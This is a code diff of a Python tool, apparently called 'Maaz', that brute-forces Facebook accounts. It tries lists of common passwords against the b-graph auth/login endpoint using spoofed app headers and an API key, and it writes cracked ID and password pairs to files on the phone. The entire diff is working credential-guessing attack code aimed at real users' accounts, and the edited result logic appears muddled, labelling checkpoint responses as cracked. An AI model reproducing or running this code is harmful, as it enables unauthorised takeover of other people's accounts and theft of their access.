@@ -403,11 +403,19 @@ def login1(uid):
     Session = requests.session()
     try:
         sys.stdout.write(
-            f'\r\r\x1b[38;5;46m[\x1b[38;5;46mMaaz\x1b[38;5;46m-\x1b[38;5;46mB1\x1b[38;5;46m]\033[1;97m-\x1b[38;5;46m[\033[1;97m{loop}\x1b[38;5;46m]\033[1;97m-\x1b[38;5;46m[\x1b[38;5;46mOK\x1b[38;5;46m/\x1b[38;5;226mCP\x1b[38;5;46m]\033[1;97m-\x1b[38;5;46m[\x1b[38;5;46m{len(oks)}\x1b[38;5;46m/\x1b[38;5;46m{len(cps)}\x1b[38;5;46m]'
+            f'\r\r\33[38;5;37m[\x1b[38;5;46mMaaz\33[38;5;37m-\x1b[38;5;46mOK\33[38;5;37m]'
+            f'\033[1;97m-\33[38;5;37m[\033[1;97m{loop}\33[38;5;37m]'
+            f'\033[1;97m-\33[38;5;37m[\x1b[38;5;46mOK\33[38;5;160m/'
+            f'\x1b[38;5;208mCP\33[38;5;37m]\033[1;97m-'
+            f'\33[38;5;37m[\x1b[38;5;46m{len(oks)}'
+            f'\33[38;5;160m/\x1b[38;5;208m{len(cps)}\33[38;5;37m]'
         )
         sys.stdout.flush()
+
         ua = random.choice(ugen)
-        for pw in ["123456", "1234567", "12345678", "123456789", "786786", "1234567890", "112233", "14081947"]:
+        ua = windows()
+
+        for pw in ["123456", "1234567", "12345678", "123456789", "111222", "123123"]:
             data = {
                 'adid': str(uuid.uuid4()),
                 'format': 'json',
@@ -431,6 +439,7 @@ def login1(uid):
                 'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
                 'api_key': '882a8490361da98702bf97a021ddc14d'
             }
+
             head = {
                 'User-Agent': ua,
                 'Content-Type': 'application/x-www-form-urlencoded',
@@ -449,24 +458,36 @@ def login1(uid):
                 'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',
                 'Content-Length': '706'
             }
+
             url = "https://b-graph.facebook.com/auth/login"
-            rp = requests.post(url, data=data, headers=head, allow_redirects=False, verify=True).json()
+            rp = requests.post(
+                url,
+                data=data,
+                headers=head,
+                allow_redirects=False,
+                verify=True
+            ).json()
             if "session_key" in rp:
-                oks.append(uid)
-                open("/sdcard/OLD_CLONING-OK.txt", "a").write(uid + "|" + pw + "\n")
-                print(f'\r\033[38;5;46m[MAAZ-OK] {uid} ● {pw}\033[1;97m')
-                os.system('espeak -a 300 "OK ID Found"')
-                break
-
-            elif "www.facebook.com" in rp['error']['message']:
                 cps.append(uid)
-                open("/sdcard/OLD_CLONING-CP.txt", "a").write(uid + "|" + pw + "\n")
-                print(f'\r\033[38;5;226m[MAAZ-CP] {uid} ● {pw}\033[1;97m')
-                os.system('espeak -a 300 "Checkpoint ID"')
                 break
-            else:continue
-        loop+=1
-    except Exception as e:time.sleep(30)
 
+            elif "error" in rp and "www.facebook.com" in rp.get("error", {}).get("message", ""):
+                print(
+                    f'\r\r\r\r\r\33[38;5;37m[\x1b[38;5;46mMaaz\033[1;97m-'
+                    f'\x1b[38;5;46mOK\33[38;5;37m] \x1b[38;5;46m{uid} '
+                    f'\033[1;97m● \x1b[38;5;46m{pw}\033[1;97m'
+                )
+                os.system('espeak -a 300 " Cracked Ok id,"')
+                open("/sdcard/maaz-OLD-OK.txt", "a").write(uid + "|" + pw + "\n")
+                oks.append(uid)
+                break
+
+            else:
+                continue
+
+        loop += 1
+
+    except Exception as e:
+        time.sleep(30)
 if __name__ == "__main__":
     main()
